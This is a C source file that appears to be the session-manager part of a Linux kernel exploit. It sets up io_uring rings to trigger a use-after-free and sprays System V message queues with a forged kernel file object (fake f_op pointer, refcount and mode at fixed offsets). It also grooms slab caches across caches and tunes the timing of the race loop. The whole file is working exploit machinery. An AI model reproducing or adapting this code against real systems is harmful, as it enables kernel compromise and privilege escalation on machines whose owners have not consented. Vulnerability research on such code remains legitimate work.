#include "manager.h"
#include <sys/resource.h>
/*
 *
 * Internal functions
 *
 * */
static inline void cls()
{
    printf("\e[1;1H\e[2J");
}

static inline err_t init_thread_sync(struct manager *mgr)
{
    pthread_cond_init(&mgr->uaf_cond, NULL);
    pthread_mutex_init(&mgr->uaf_mutex, NULL);
    mgr->threads_go = 0;

    if(mgr->sleep_before_tee > 13000)
        mgr->sleep_before_tee = 10000;
    else
        mgr->sleep_before_tee += 40;

    return SUCC;
}

static inline err_t deinit_thread_sync(struct manager *mgr)
{
    pthread_cond_destroy(&mgr->uaf_cond);
    pthread_mutex_destroy(&mgr->uaf_mutex);
    mgr->threads_go = 0;
    return SUCC;
}

static inline err_t init_msg_queue(struct manager *mgr)
{
    IF_ERR_RET(pre_spray_msg(mgr->msq_ids, TOTAL_MSGS))
    return SUCC;
}

static inline void set_file_spray_data(struct manager* mgr)
{
    /* Construct a fuzzy file object */
#define F_OP_OFF (88)
#define REF_OFF (128)
#define F_MODE_OFF (140)
#define MSGSEG_OFF (4000)

    memset((char *)mgr->spray, 0, MSG_SIZE);

    char *file_contents = (char *) mgr->spray + MSGSEG_OFF;
    uint8_t *f_op = file_contents + F_OP_OFF;
    uint8_t *refcount = file_contents + REF_OFF;
    uint8_t *f_mode = file_contents + F_MODE_OFF;

    *(uint64_t *) f_op = NULL_MEM;
    *(uint64_t *) refcount = 1;
    *(uint64_t *) f_mode = 0x4000;
}

static inline void set_err_state(struct manager* mgr)
{
    /* ERR == -1 signifies that a field is in an uninitialised state.
     * It's particularly useful for handling looped close/open.
     * Since we can break out of the loop when we see ERR. */
    memset(mgr->msq_ids, ERR, sizeof(mgr->msq_ids));
    memset(mgr->pipes_in, ERR, sizeof(mgr->pipes_in));
    memset(mgr->pipes_out, ERR, sizeof(mgr->pipes_in));
}

static int32_t open_file()
{
#define TEMP_PATH ("/tmp/fileXXXXXX")
    char template[] = TEMP_PATH;
    int fd = mkstemp(template);
    IF_ERR(fd) {
        perror("open_file:mkstemp");
        return ERR;
    }
    unlink(template);

    return fd;
}

static void remove_file(int32_t fd)
{
    close(fd);
}

static void deinit_manager(struct manager *mgr)
{
    deinit_thread_sync(mgr);
    io_uring_queue_exit(&mgr->tee_ring);
    io_uring_queue_exit(&mgr->uaf_ring);

    deinit_cross_cache(mgr->cc);
}

err_t init_manager(struct manager *mgr, uint8_t new)
{
    /* If this the first iteration of the race loop
     * then we'll want to create the msg queues.
     * Otherwise, avoid wasting space. */
    if (new) {
        /* Initialise all data in mgr to ERR. */
        set_err_state(mgr);
        /* Set the initial sleep. */
        mgr->sleep_before_tee = 10600;
        /* Setup the msg queue, only once per startup. */
        IF_ERR(init_msg_queue(mgr)) {
            goto err_msg_queue;
        }
    }
    /* Set the data which we will overwrite a file. */
    set_file_spray_data(mgr);

    /* Init the two rings which we trigger the UAF on. */
    IF_ERR(init_ring(&mgr->uaf_ring))
        goto err_uaf_ring;
    IF_ERR(init_ring(&mgr->tee_ring))
        goto err_tee_ring;
    /* Init the cond. variable and mutex for the threads. */
    IF_ERR(init_thread_sync(mgr))
        goto err_thread;

    /* Init the cross cache management structure and store. */
    mgr->cc = init_cross_cache(open_file,
                               remove_file,
                               OBJS_PER_SLAB,
                               CPU_PARTIAL,
                               OBJS_PER_PAGE);
    IF_ERR_PTR(mgr->cc)
        goto err_cc;

    return SUCC;

err_cc:
err_thread:
    io_uring_queue_exit(&mgr->tee_ring);
err_tee_ring:
    io_uring_queue_exit(&mgr->uaf_ring);
err_uaf_ring:
err_msg_queue:
    return ERR;
}

/*
 *
 * API functions
 *
 * */
err_t open_pipes(struct manager *mgr, int in)
{
    for (int i = 0; i < N_PIPES; i++) {
        int p_fd[2] = {0};
        IF_ERR(pipe(p_fd)) {
            perror("open_pipes:pipe");
            return ERR;
        }
        if (in) {
            mgr->pipes_in[i][RD] = p_fd[RD];
            mgr->pipes_in[i][WR] = p_fd[WR];
        } else {
            mgr->pipes_out[i][RD] = p_fd[RD];
            mgr->pipes_out[i][WR] = p_fd[WR];
        }
    }
    return SUCC;
}

err_t start_threads(struct manager *mgr, pthread_t *ths,
                         void *fptr, uint32_t num)
{
    for (int i = 0; i < num; i++) {
        if (pthread_create(&ths[i], NULL, fptr, mgr))
            return ERR;
    }
    return SUCC;
}

err_t wait_threads(pthread_t *ths, uint32_t num)
{
    for (int i = 0; i < num; i++) {
        pthread_join(ths[i], NULL);
    }
    return SUCC;
}

err_t wait_condition(pthread_mutex_t *mutex,
                     pthread_cond_t *cond, bool *boolean)
{
    pthread_mutex_lock(mutex);
    while (*boolean == 0) {
        pthread_cond_wait(cond, mutex);
    }
    pthread_mutex_unlock(mutex);

    return SUCC;
}

err_t set_condition(pthread_mutex_t *mutex,
                    pthread_cond_t *cond, bool *boolean)
{
    pthread_mutex_lock(mutex);
        *boolean = 1;
    pthread_cond_broadcast(cond);
    pthread_mutex_unlock(mutex);

    return SUCC;
}

struct manager* new_session()
{
    struct manager *mgr = calloc(1, sizeof(struct manager));
    IF_ERR_PTR(mgr) {
        perror("new_session:calloc");
        return ERR_PTR;
    }
#define REFRESH (0)
#define NEW (1)
    IF_ERR(init_manager(mgr, NEW))
        goto err_mgr;
    IF_ERR(new_tls_session())
        goto err_mgr;

    return mgr;

err_mgr:
    deinit_manager(mgr);
    free(mgr);
    return ERR_PTR;
}

err_t refresh_session(struct manager *mgr)
{
    //printf("\e[1;1H\e[2J");

    deinit_manager(mgr);
    IF_ERR_RET(init_manager(mgr, REFRESH))
    close_range(2, ~0, 0);
    return SUCC;
}

void end_session(struct manager *mgr)
{
    end_tls_session();
    deinit_manager(mgr);
    free(mgr);
}
